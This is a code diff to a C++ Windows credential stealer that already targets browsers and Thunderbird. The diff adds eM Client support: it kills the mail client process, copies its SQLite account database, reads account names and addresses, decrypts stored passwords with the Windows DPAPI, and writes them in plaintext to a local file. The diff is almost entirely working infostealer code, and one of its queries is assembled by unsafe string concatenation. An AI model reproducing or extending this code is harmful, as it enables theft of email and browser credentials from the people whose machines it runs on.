@@ -50,6 +50,7 @@ void clear_hardware_breakpoints(uint32_t process_id);
 void set_resume_flag(uint32_t thread_id);
 bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
 void extract_firefox_data(const BrowserConfig& config, const std::wstring& user_data_dir);
+void extract_emclient_data(const BrowserConfig& config, const std::wstring& user_data_dir);
 
 int main() {
     std::vector<BrowserConfig> configs = {
@@ -152,6 +153,16 @@ int main() {
             "thunderbird_extract",
             "thunderbird_tmp",
             false, true, false, true
+        },
+        {
+            "eM Client",
+            "MailClient.exe",
+            {L"C:\\Program Files (x86)\\eM Client\\MailClient.exe"},
+            "",
+            {L"eM Client"},
+            "emclient_extract",
+            "emclient_tmp",
+            false, true, false, false
         }
     };
 
@@ -164,6 +175,7 @@ int main() {
     kill_processes_by_name("waterfox.exe");
     kill_processes_by_name("librewolf.exe");
     kill_processes_by_name("thunderbird.exe");
+    kill_processes_by_name("MailClient.exe");
 
     for (const auto& config : configs) {
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
@@ -188,6 +200,11 @@ int main() {
 
         if (config.is_firefox) {
             extract_firefox_data(config, user_data_dir);
+            continue;
+        }
+
+        if (config.name == "eM Client") {
+            extract_emclient_data(config, user_data_dir);
             continue;
         }
 
@@ -1105,4 +1122,61 @@ void extract_firefox_passwords(const fs::path& profile_path, const fs::path& out
         nss.NSS_Shutdown();
     }
     FreeLibrary(nss.h_nss);
+}
+
+void extract_emclient_data(const BrowserConfig& config, const std::wstring& user_data_dir) {
+    fs::path db_path = fs::path(user_data_dir) / "main.dat";
+    if (!fs::exists(db_path)) return;
+
+    fs::path output_root(config.output_dir);
+    fs::create_directories(output_root);
+    std::ofstream ofs(output_root / "accounts.txt");
+
+    fs::path temp_db = fs::temp_directory_path() / (config.temp_prefix + "_main_" + std::to_string(GetTickCount64()));
+    fs::copy(db_path, temp_db);
+
+    sqlite3* db;
+    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+        sqlite3_stmt* stmt;
+        // Query based on common eM Client schema findings
+        const char* sql = "SELECT AccountName, AccountAddress, AccountUID FROM Accounts";
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+            while (sqlite3_step(stmt) == 100) {
+                const char* name = (const char*)sqlite3_column_text(stmt, 0);
+                const char* addr = (const char*)sqlite3_column_text(stmt, 1);
+                const char* uid = (const char*)sqlite3_column_text(stmt, 2);
+
+                ofs << "Account: " << (name ? name : "") << " (" << (addr ? addr : "") << ")\n";
+
+                // Try to find password in AccountUIDs or related tables if possible,
+                // but usually eM Client stores it in encrypted columns in specific tables.
+                // Modern versions often use a more complex XML storage in some columns.
+                // We'll search for 'Password' in common settings tables.
+
+                sqlite3_stmt* stmt2;
+                std::string sql2 = "SELECT SettingValue FROM AccountSettings WHERE AccountUID = '" + std::string(uid ? uid : "") + "' AND SettingName = 'Password'";
+                if (sqlite3_prepare_v2(db, sql2.c_str(), -1, &stmt2, NULL) == 0) {
+                    if (sqlite3_step(stmt2) == 100) {
+                        const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt2, 0);
+                        int blob_size = sqlite3_column_bytes(stmt2, 0);
+                        if (blob_ptr && blob_size > 0) {
+                            DATA_BLOB input = { (DWORD)blob_size, (BYTE*)blob_ptr };
+                            DATA_BLOB output = { 0, NULL };
+                            if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+                                std::string pass((char*)output.pbData, output.cbData);
+                                ofs << "  Password: " << pass << "\n";
+                                LocalFree(output.pbData);
+                            }
+                        }
+                    }
+                    sqlite3_finalize(stmt2);
+                }
+                ofs << "------------------------------------------\n";
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+    fs::remove(temp_db);
+    std::cout << "eM Client extraction complete. Data saved in " << config.output_dir << " folder." << std::endl;
 }
